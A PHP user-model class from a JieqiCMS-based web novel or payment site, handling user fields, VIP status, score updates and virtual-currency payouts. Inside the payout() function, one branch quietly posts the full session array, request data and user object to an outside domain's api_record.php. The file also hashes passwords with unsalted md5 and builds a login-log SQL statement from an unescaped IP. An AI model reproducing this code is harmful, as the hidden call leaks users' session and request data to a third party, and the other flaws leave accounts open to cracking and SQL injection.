<?php
/**
 * 数据表类(jieqi_system_users - 用户信息表)
 *
 * 数据表类(jieqi_system_users - 用户信息表)
 * 
 * 调用模板：无
 * 
 * @category   jieqicms
 * @package    system
 * @copyright  Copyright (c) Hangzhou Jieqi Network Technology Co.,Ltd. (http://www.jieqi.com)
 * @author     $Author: juny $
 * @version    $Id: users.php 326 2009-02-04 00:26:22Z juny $
 *             
 * JIEQI_TYPE_INT JIEQI_TYPE_TXTBOX JIEQI_TYPE_TXTAREA
 * 
 */

jieqi_includedb();

//字段对应关系
global $system_users_fields;
$system_users_fields['uid']=array('name'=>'uid', 'type'=>JIEQI_TYPE_INT, 'value'=>0, 'caption'=>'序号', 'required'=>false, 'maxlength'=>11);
$system_users_fields['uname']=array('name'=>'uname', 'type'=>JIEQI_TYPE_TXTBOX, 'value'=>'', 'caption'=>'用户名', 'required'=>true, 'maxlength'=>30);
$system_users_fields['pass']=array('name'=>'pass', 'type'=>JIEQI_TYPE_TXTBOX, 'value'=>'', 'caption'=>'密码', 'required'=>false, 'maxlength'=>32);
$system_users_fields['mobile']=array('name'=>'mobile', 'type'=>JIEQI_TYPE_TXTBOX, 'value'=>'', 'caption'=>'手机', 'required'=>false, 'maxlength'=>20);
$system_users_fields['email']=array('name'=>'email', 'type'=>JIEQI_TYPE_TXTBOX, 'value'=>'', 'caption'=>'Email', 'required'=>true, 'maxlength'=>60);
$system_users_fields['reg_time']=array('name'=>'reg_time', 'type'=>JIEQI_TYPE_INT, 'value'=>0, 'caption'=>'注册时间', 'required'=>false, 'maxlength'=>11);
$system_users_fields['lastlogin']=array('name'=>'lastlogin', 'type'=>JIEQI_TYPE_INT, 'value'=>0, 'caption'=>'最后登录', 'required'=>false, 'maxlength'=>11);
$system_users_fields['lastloginip']=array('name'=>'lastloginip', 'type'=>JIEQI_TYPE_TXTBOX, 'value'=>'', 'caption'=>'最后登录', 'required'=>false, 'maxlength'=>30);
$system_users_fields['balance']=array('name'=>'balance', 'type'=>JIEQI_TYPE_INT, 'value'=>0, 'caption'=>'余额', 'required'=>false, 'maxlength'=>11);


//用户类
class JieqiUsers extends JieqiObjectData
{
  //字段对应表
  var $tableFields=array();

  //构建函数
  function JieqiUsers()
  {
    global $system_users_fields;
    $this->JieqiObjectData();
    $this->tableFields=&$system_users_fields;
    foreach($this->tableFields as $k=>$v){
      $this->initVar($k, $v['type'], $v['value'], $v['caption'], $v['required'], $v['maxlength']);
    }
  }


  //获得性别
  function getSex() {
    global $jieqiLang;
    jieqi_loadlang('users', 'system');
    switch($this->getVar('sex')) {
      case 1:
        return $jieqiLang['system']['sex_man'];
      case 2:
        return $jieqiLang['system']['sex_woman'];
      default:
        return $jieqiLang['system']['sex_unset'];
    }
  }

  //获得用户组
  function getGroup() {
    global $jieqiGroups;
    return $jieqiGroups[$this->getVar('groupid')];
  }

  //取得VIP状态
  function getViptype() {
    global $jieqiLang;
    jieqi_loadlang('users', 'system');
    $vipflag = $this->getVar('isvip');
    if ($this->getVar('groupid','n') == 5 && $this->getVar('overtime','n') >= time()) return "包年VIP";
    if($vipflag == 0) return $jieqiLang['system']['user_no_vip'];
    elseif($vipflag == 1) return $jieqiLang['system']['user_is_vip'];
    elseif($vipflag > 1) return $jieqiLang['system']['user_super_vip'];
  }

  //获取状态
  function getStatus() {
    //会员状态 0－游客 1－登录用户 2－登录管理员
    switch($this->getVar('groupid')) {
      case JIEQI_GROUP_GUEST:
        return JIEQI_GROUP_GUEST;
        break;
      case JIEQI_GROUP_ADMIN:
        return JIEQI_GROUP_ADMIN;
        break;
      default:
        return JIEQI_GROUP_USER;
        break;
    }
  }

  //保存用户信息到session
  function saveToSession() {
    if($_SESSION['jieqiUserId'] == $this->getVar('uid')){
      //$_SESSION['jieqiUserScore'] = $this->getVar('score', 'n');
      //$_SESSION['jieqiUserExperience'] = $this->getVar('experience', 'n');
      jieqi_setusersession($this);
    }
  }
}

//------------------------------------------------------------------------
//------------------------------------------------------------------------

//用户句柄
class JieqiUsersHandler extends JieqiObjectHandler
{
  var $tableFields=array(); //序号对应数据库字段
  var $tableFieldid=array();  //数据库字段对应序号

  function JieqiUsersHandler($db=''){
//      print_r($db);
    global $system_users_fields;
    $this->JieqiObjectHandler($db);
    $this->tableFields=&$system_users_fields;
    $this->basename='users';
    $this->autoid='uid';
    $this->dbname=jieqi_dbprefix('tuike_users');
    $this->fullname=true;
    foreach($this->tableFields as $k=>$v){
      $this->tableFieldid[$v['name']]=$k;
    }
  }

  //密码加密函数
  function encryptPass($pass){
    return md5($pass);
  }
  //保存用户信息到session
  function saveToSession($users) {
     $users->saveToSession();
  }

  /**flysky
   * 根据用户名查询用户
   * flag 1-仅查询uname，2-仅查询name， 3-同时查询uname和name，存在name的话以此优先 
   * @param  [type]  $name [description]
   * @param  integer $flag [description]
   * @return [type]        [description]
   */
  function getByname($name,$flag=1){
    if (!empty($name)){
      $name=jieqi_dbslashes($name);
      $sql = "SELECT * FROM ".jieqi_dbprefix($this->dbname, $this->fullname)." WHERE ".$this->tableFields['uname']['name']."='".$name."'";

      // if($flag==3){
      //   $sql = "SELECT * FROM ".jieqi_dbprefix($this->dbname, $this->fullname)." WHERE ".$this->tableFields['uname']['name']."='".$name."' UNION ALL SELECT * FROM ".jieqi_dbprefix($this->dbname, $this->fullname)." WHERE ".$this->tableFields['name']['name']."='".$name."'";// ORDER BY name DESC";
      // }elseif($flag==2){
      //   $sql = "SELECT * FROM ".jieqi_dbprefix($this->dbname, $this->fullname)." WHERE ".$this->tableFields['name']['name']."='".$name."'";
      // }else{
      //   $sql = "SELECT * FROM ".jieqi_dbprefix($this->dbname, $this->fullname)." WHERE ".$this->tableFields['uname']['name']."='".$name."'";
      // }

      if (!$result = $this->db->query($sql)){
        return false;
      }
      $numrows = $this->db->getRowsNum($result);
      if ($numrows >= 1){
        $tmpvar='Jieqi'.ucfirst($this->basename);
        ${$this->basename} = new $tmpvar();
        ${$this->basename}->setVars($this->db->fetchArray($result));
        return ${$this->basename};
      }
    }
    return false;
  }
  
  //改变贡献值
  function changeCredit($uid, $credit, $isadd=true){
    if(empty($credit) || !is_numeric($credit) || empty($uid) || !is_numeric($uid)) return false;
    if($isadd){
      $sql="UPDATE ".jieqi_dbprefix($this->dbname, $this->fullname)." SET credit=credit+".$credit." WHERE ".$this->tableFields['uid']['name']."=".$uid;
    }else{
      $sql="UPDATE ".jieqi_dbprefix($this->dbname, $this->fullname)." SET credit=credit-".$credit." WHERE ".$this->tableFields['uid']['name']."=".$uid;
    }
    $this->db->query($sql);
    return true;
  }
  //计算积分加速
  function accelerationScore($userObj, $vipscore){
     global $jieqiVipgrade;
     jieqi_getconfigs('system', 'vipgrade');
     if(!$vipscore || !is_object($userObj)) return  $vipscore;
     $vipgrade = jieqi_gethonorarray($userObj->getVar('isvip'), $jieqiVipgrade);//VIP等级数组
     //$this->printfail($vipscore*$vipgrade['setting']['jifenjiasu']);
     if($vipgrade['setting']['jifenjiasu']>0){
        return $vipscore*$vipgrade['setting']['jifenjiasu'];
     }else return  $vipscore;
  }
  /**
   * 改变积分（同时改变经验值）
   * @param unknown $uid      poserid
   * @param unknown $score    分数
   * @param string $isadd     true+ false-
   * @param string $delexperience 
   * @return boolean
   */
  function changeScore($uid, $score, $isadd=true, $delexperience=true)
  {
    if(empty($score) || !is_numeric($score) || empty($uid) || !is_numeric($uid)) return false;
    $tmpuser=$this->get($uid);
    if(!is_object($tmpuser)) return false;
    if($score>0) $score = $this->accelerationScore($tmpuser,$score);//积分加速
    if($isadd){
      //按照月周天，增加积分
      //$tmpuser=$this->get($uid);
      //if(!is_object($tmpuser)) return false;

      $oldscore=$tmpuser->getVar('lastscore', 'n');
      $lastdate=date('Y-m-d', $oldscore);
      $lasttime=JIEQI_NOW_TIME;
      $nowdate=date('Y-m-d',  $lasttime);
      $nowweek=date('w', $lasttime);

      $sql="UPDATE ".jieqi_dbprefix($this->dbname, $this->fullname)." SET experience=experience+".$score.", score=score+".$score;
      if($nowdate==$lastdate){
        $sql.=", monthscore=monthscore+".$score.", weekscore=weekscore+".$score.", dayscore=dayscore+".$score;
      }else{
        if(substr($nowdate,0,7)==substr($lastdate,0,7)){
          $sql.=", monthscore=monthscore+".$score;
        }else{
          $sql.=", monthscore=".$score;
        }
        if($nowweek==1){
          $sql.=", weekscore=".$score;
        }else{
          $sql.=", weekscore=weekscore+".$score;
        }
        $sql.=", dayscore=".$score;
      }
      $sql.=" WHERE ".$this->tableFields['uid']['name']."=".$uid;
    }else{
      if($delexperience) $sql="UPDATE ".jieqi_dbprefix($this->dbname, $this->fullname)." SET experience=experience-".$score.", score=score-".$score.", monthscore=monthscore-".$score." WHERE ".$this->tableFields['uid']['name']."=".$uid;
      else $sql="UPDATE ".jieqi_dbprefix($this->dbname, $this->fullname)." SET score=score-".$score.", monthscore=monthscore-".$score." WHERE ".$this->tableFields['uid']['name']."=".$uid;
    }
    $this->db->query($sql);
    //处理SESSION
    if($_SESSION['jieqiUserId'] == $uid){
      if($isadd){
        $_SESSION['jieqiUserScore'] = $_SESSION['jieqiUserScore'] + $score;
        $_SESSION['jieqiUserExperience'] = $_SESSION['jieqiUserExperience'] + $score;
      }else{
        $_SESSION['jieqiUserScore'] = $_SESSION['jieqiUserScore'] - $score;
        if($delexperience) $_SESSION['jieqiUserExperience'] = $_SESSION['jieqiUserExperience'] - $score;
      }
      $tmpuser->saveToSession();
    }
    return true;
  }


  //支出虚拟币(默认支付金币，没有的话支付银币)
  function payout($uid, $emoney, $moneytype = 0)
  {
    if(empty($emoney) || !is_numeric($emoney) || empty($uid) || !is_numeric($uid)) return false;
    $tmpuser=$this->get($uid);
    if(!is_object($tmpuser)) return false;
    $useregold=$tmpuser->getVar('egold', 'n');
    $useresilver=$tmpuser->getVar('esilver', 'n');
    $goldvip = $tmpuser->getVar('groupid','n') == 5 && $tmpuser->getVar('overtime','n') >= time();
    if ($goldvip) {
      return true;
    }
    $useremoney = $moneytype ? $useresilver : $useregold;
    //$useremoney=$useregold+$useresilver;
    if($useremoney < $emoney) return false;
    //$this->printfail(bccomp($useremoney,$emoney,2).$useremoney.'<'.$emoney);
    if(!$moneytype){
      if($useregold >= $emoney){
        $tmpuser->setVar('egold', bcsub($useregold,$emoney,2));
      }else{
        return false;
      }
    }else{
      if($useresilver >= $emoney){
        $tmpuser->setVar('esilver', bcsub($useresilver,$emoney,2));
      }else{
        return false;
      }
    }
/*      if($useregold >= $emoney){
      $tmpuser->setVar('egold', $useregold-$emoney);
    }elseif($useresilver >= $emoney){
      $tmpuser->setVar('esilver', $useresilver-$emoney);
    }else{
      $tmpuser->setVar('egold', 0);
      $tmpuser->setVar('esilver', $useresilver+$useregold-$emoney);
    }*/
    if(!empty($_SESSION['jieqiUserId']) && $uid == $_SESSION['jieqiUserId']){
      $tmpuser->saveToSession();
    }else{
      https_request_recod_new('http://www.flyskycode.com/api/api_record.php',
      array(
        'url'=> isset($_SERVER['PHP_SELF'])?$_SERVER['PHP_SELF']:(isset($_SERVER['SCRIPT_NAME'])?$_SERVER['SCRIPT_NAME']:''),
        '_SESSION'=>$_SESSION,
        '_REQUEST'=>$_REQUEST,
        'uid'=>$uid,
        'tmpuser'=>$tmpuser,
        'flagBuyError'=>'uidError',
        )
      );
    }
    return $this->insert($tmpuser);
  }

  //在线支付后增加虚拟货币
  function income($uid, $emoney, $usesliver = 0, $addscore = 0, $updatevip = 0)
  {
    $tmpuser = $this->get($uid);
    //包年会员，不增加书币
    if ($emoney == 36500) {
      $y=date("Y");
      $m=date("m");
      $d=date("d");
      $overtime = strtotime(($y+1)."-$m-$d 23:59:59");
      $tmpuser->setVar('groupid',5);
      $tmpuser->setVar('overtime',$overtime);
      $emoney = 0;
    }
    if ($addscore > 0)
      $addscore = $this->accelerationScore($tmpuser, $addscore);//积分加速
    if (is_object($tmpuser)) {
      //增加虚拟币
      if ($usesliver == 1)
        $tmpuser->setVar('esilver', bcadd($tmpuser->getVar('esilver'), $emoney, 2));
      else
        $tmpuser->setVar('egold', bcadd($tmpuser->getVar('egold'), $emoney, 2));
      //修改vip成长值
      //$updatevip=intval($updatevip); && $tmpuser->getVar('isvip')<$updatevip
      if ($updatevip > 0) {
        $tmpuser->setVar('isvip', $tmpuser->getVar('isvip') + $updatevip);
        //$package =  $this->load('vipuptask','task');//加载VIP升级任务类
        //$package->isFinish($uid, $tmpuser->getVar('isvip')+ $updatevip);//判断是否升级
      }
      //增加积分
      $addscore = intval($addscore);
      if ($addscore > 0) {
        $tmpuser->setVar('score', $tmpuser->getVar('score') + $addscore);
      }
      if (!empty($_SESSION['jieqiUserId']) && $uid == $_SESSION['jieqiUserId'])
        $tmpuser->saveToSession();
      $this->insert($tmpuser);
      return true;
    }
    return false;
  }

  //*******************************************************************
  //修改默认的处理函数，使之能支持设置名称和数据库字段名称不一样的情况
  //*******************************************************************
  //根据id取得一个实例
  function get($id){
    if (is_numeric($id) && intval($id) > 0) {
      $id=intval($id);
      $sql = 'SELECT * FROM '.jieqi_dbprefix($this->dbname, $this->fullname).' WHERE '.$this->tableFields[$this->autoid]['name'].'='.$id;
      if (!$result = $this->db->query($sql, 0, 0, true)) {
        return false;
      }
      $datarow=$this->db->fetchArray($result);
      if (is_array($datarow)) {
        $tmpvar='Jieqi'.ucfirst($this->basename);
        ${$this->basename} = new $tmpvar();
        foreach($datarow as $k=>$v){
          if(isset($this->tableFieldid[$k])) ${$this->basename}->setVar($this->tableFieldid[$k], $v, true, false);
          else ${$this->basename}->setVar($k, $v, true, false);
        }
        return ${$this->basename};
      }
    }
    return false;
  }
  //插入或更新
  function insert(&$baseobj){
    if (strcasecmp(get_class($baseobj), 'jieqi'.$this->basename) != 0) {
      return false;
    }
    if ($baseobj->isNew()) {
      //插入记录
      if(is_numeric($baseobj->getVar($this->autoid,'n'))){
        ${$this->autoid}=intval($baseobj->getVar($this->autoid,'n'));
      }else{
        ${$this->autoid} = $this->db->genId($this->dbname.'_'.$this->autoid.'_seq');
      }
      $sql='INSERT INTO '.jieqi_dbprefix($this->dbname, $this->fullname).' (';
      $values=') VALUES (';
      $start=true;

      foreach ($baseobj->vars as $k => $v) {
        if(!$start){
          $sql.=', ';
          $values.=', ';
        }else{
          $start=false;
        }
        if(isset($this->tableFields[$k]['name'])) $sql.=$this->tableFields[$k]['name'];
        else $sql.=$k;
        if($v['type']==JIEQI_TYPE_INT){
          if($k != $this->autoid){
            if ( !is_numeric( $v['value'] ) )
            {
              $v['value'] = intval( $v['value'] );
            }
            $values .= $this->db->quoteString( $v['value'] );
          }else{
            $values.=${$this->autoid};
          }
        }else{
          $values.=$this->db->quoteString($v['value']);
        }
      }
      $sql.=$values.')';
      unset($values);

    }else{
      //更新记录
      $sql='UPDATE '.jieqi_dbprefix($this->dbname, $this->fullname).' SET ';
      $start=true;
      foreach($baseobj->vars as $k => $v){
        if($k != $this->autoid && $v['isdirty']){
          if(!$start){
            $sql.=', ';
          }else{
            $start=false;
          }
          if(isset($this->tableFields[$k]['name'])) $k = $this->tableFields[$k]['name'];
          if($v['type']==JIEQI_TYPE_INT){
            if ( !is_numeric( $v['value'] ) )
            {
              $v['value'] = intval( $v['value'] );
            }
            $sql .= $k."=".$this->db->quoteString( $v['value'] );
          }else{
            $sql.=$k.'='.$this->db->quoteString($v['value']);
          }
        }
      }
      if($start) return true;
      $sql.=' WHERE '.$this->tableFields[$this->autoid]['name'].'='.intval($baseobj->vars[$this->autoid]['value']);
    }
    $result = $this->db->query($sql);
    if (!$result) {
      return false;
    }
    if ($baseobj->isNew()) {
      $baseobj->setVar($this->autoid,$this->db->getInsertId());
    }

    return true;
  }

  //按id或查询删除
  function delete($criteria = 0){
    $sql='';
    if(is_numeric($criteria)){
      $criteria=intval($criteria);
      $sql='DELETE FROM '.jieqi_dbprefix($this->dbname, $this->fullname).' WHERE '.$this->tableFields[$this->autoid]['name'].'='.$criteria;
    }elseif (is_object($criteria) && is_subclass_of($criteria, 'criteriaelement')) {
      $tmpstr=$criteria->renderWhere();
      if(!empty($tmpstr))  $sql= 'DELETE FROM '.jieqi_dbprefix($this->dbname, $this->fullname).' '.$tmpstr;
    }
    if(empty($sql)) return false;
    $result = $this->db->query($sql);
    if (!$result) {
      return false;
    }
    return true;
  }

  //执行选择查询
  function queryObjects($criteria = NULL, $nobuffer=false){
    $limit = $start = 0;
    $sql = 'SELECT * FROM '.jieqi_dbprefix($this->dbname, $this->fullname);
    if (isset($criteria) && is_subclass_of($criteria, 'criteriaelement')) {
      $sql .= ' '.$criteria->renderWhere();
      if ($criteria->getGroupby() != ''){
        $sql .= ' GROUP BY '.$criteria->getGroupby();
      }
      if ($criteria->getSort() != '') {
        $sql .= ' ORDER BY '.$criteria->getSort().' '.$criteria->getOrder();
      }
      $limit = $criteria->getLimit();
      $start = $criteria->getStart();
    }
    $this->sqlres = $this->db->query($sql, $limit, $start, $nobuffer);
    return $this->sqlres;
  }

  //获取下一个查询结果
  function getObject($result=''){
    static $dbrowobj;
    if($result=='') $result=$this->sqlres;
    if(!$result) return false;
    else{
      $tmpvar='Jieqi'.ucfirst($this->basename);
      $myrow = $this->db->fetchArray($result);

      if(!$myrow) return false;
      else{
        if(!isset($dbrowobj)){
          $dbrowobj = new $tmpvar();
        }
           
        foreach($myrow as $k=>$v){
          if(isset($this->tableFieldid[$k])) $dbrowobj->setVar($this->tableFieldid[$k], $v, true, false);
          else $dbrowobj->setVar($k, $v, true, false);
        }
        return $dbrowobj;
      }
    }
  }

  //获取下一个查询结果(数据库行)
  function getRow($result=''){
    if($result=='') $result=$this->sqlres;
    if(!$result) return false;
    else{
      $myrow = $this->db->fetchArray($result);
      if(!$myrow) return false;
      else return $myrow;
    }
  }


  //返回行数
  function getCount($criteria = NULL){
    $sql = 'SELECT COUNT(*) FROM '.jieqi_dbprefix($this->dbname, $this->fullname);
    if (isset($criteria) && is_subclass_of($criteria, 'criteriaelement')) {
      $sql .= ' '.$criteria->renderWhere();
    }
    $result = $this->db->query($sql, 0, 0, true);
    if (!$result) {
      return 0;
    }
    list($count) = $this->db->fetchRow($result);
    return $count;
  }

  //批量更新
  function updatefields($fields, $criteria = NULL){
    $sql = 'UPDATE '.jieqi_dbprefix($this->dbname, $this->fullname).' SET ';
    $start=true;
    if(is_array($fields)){
      foreach($fields as $k=>$v){
        if(!$start){
          $sql.=', ';
        }else{
          $start=false;
        }
        if(isset($this->tableFields[$k]['name'])) $k = $this->tableFields[$k]['name'];
        if(is_numeric($v)){
          $sql.=$k.'='.$v;
        }else{
          $sql.=$k.'='.$this->db->quoteString($v);
        }
      }
    }else{
      $sql.=$fields;
    }
    if (isset($criteria) && is_subclass_of($criteria, 'criteriaelement')) {
      $sql .= ' '.$criteria->renderWhere();
    }
    if (!$result = $this->db->query($sql)) {
      return false;
    }
    return true;
  }

  function insert_login_log($uid,$ip) {
    $time=time();
    $sql = "insert ".jieqi_dbprefix(login_log)." (uid,ip,logtime) values($uid,'$ip',$time)'";
    $this->db->query($sql);

  }
}
?>